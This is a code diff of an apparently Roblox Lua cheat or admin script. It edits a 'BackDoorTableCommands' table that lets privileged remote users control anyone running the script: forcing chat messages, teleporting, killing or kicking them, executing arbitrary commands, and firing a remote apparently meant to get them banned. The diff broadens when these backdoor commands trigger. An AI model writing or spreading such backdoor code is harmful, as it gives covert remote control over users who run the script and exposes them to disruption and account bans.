@@ -154,27 +154,27 @@ local StompWhitelist = {}
 
 local BackDoorTableCommands = {
 	['chat'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
 		['Levels'] = {[1] = true;[2] = true;[3] = true;}
 	};
 	['bring'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then CheckCommand("to "..CommandedPlayer.Name) end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand("to "..CommandedPlayer.Name) end end;
 		['Levels'] = {[1] = true;[2] = true;[3] = true;}
 	};
 	['kill'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then GetChar():BreakJoints() end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
 		['Levels'] = {[2] = true;[3] = true;}
 	};
 	['exec'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then CheckCommand(Content) end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand(Content) end end;
 		['Levels'] = {[2] = true;[3] = true;}
 	};
 	['kick'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then LP:Kick(Content) end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
 		['Levels'] = {[3] = true;}
 	};
 	['ban'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or Player == "All" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
 		['Levels'] = {[4] = true;}
 	};
 }
